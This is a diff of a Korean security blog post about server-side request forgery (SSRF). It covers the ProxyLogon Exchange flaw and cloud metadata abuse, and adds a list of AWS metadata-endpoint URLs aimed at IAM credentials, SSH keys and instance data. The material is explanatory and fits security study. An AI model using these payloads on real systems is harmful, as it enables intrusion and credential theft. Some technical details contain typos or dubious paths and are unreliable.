@@ -42,3 +42,42 @@ SSRF 를 활용한 공격 방식은 크게 3가지로 분류할 수 있다.
   <h4 style="color:red;">SSRF 의 경우 프로토콜에 대한 제한을 받지 않기때문에 FTP, SMTP, … 등 과 URI 스킴이 상용 가능하다.</h4>
 </div>
 
+## 2. Porxy Logon 기반 SSRF
+2021년 CVE에 등록된 공개 취약점인 MS Exchange SSRF 를 활용
+1. X-BEResoucrce 쿠키 변조를 통해 내부 서버 리소스 접근 가능
+
+💡 **<u>X-BEResource는 Microsoft Exchange 서버에서 사용되는 특별한 HTTP 헤더이며, 이 헤더는 Exchange 서버의 원격 프로시저 호출(RPC) 기능에 대한 액세스를 관리하는데 사용된다.</u>** 
+{: .notice--primary} 
+
+2. /etc/proxyLogon.ecp 파일을 호출하여, 강제로 세션 연결이 가능한 proxyLogon을 이용해 별도의 인증 없이 공격자와 Exchange server와 HTTP연결 수행
+
+> 해당 방법은 CVE-2021-26855 를 통해 자세하게 확인 가능하다.
+
+## AWS 클라우드 기반 SSRF
+
+💡 **<u>AWS 외에도 GCP, Azre, Digital Ocean등 public cloud를 사용하는 경우 Metadata API 로의 접근을 통해 instance에 대한 정보를 얻거나 중요한 키 값을 얻어 시스템을 탈취할 수 있다.u>** 
+{: .notice--primary} 
+
+<div class="notice">
+  [AWS]<br>
+# 169.254.169.254<br>
+http://169.254.169.254/latest/user-data<br>
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]<br>
+http://169.254.169.254/latest/meta-data/<br>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]<br>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance<br>
+http://169.254.169.254/latest/meta-data/ami-id<br>
+http://169.254.169.254/latest/meta-data/reservation-id<br>
+http://169.254.169.254/latest/meta-data/hostname<br>
+http://169.254.169.254/latest/meta-data/public-keys/<br>
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key<br>
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key<br>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy<br>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access<br>
+http://169.254.169.254/latest/dynamic/instance-identity/document<br>
+<br>
+# instance-data<br>
+http://instance-data/latest/meta-data<br>
+http://instance-data/latest/meta-data/hostname<br>
+http://instance-data/latest/meta-data/public-keys/
+</div>
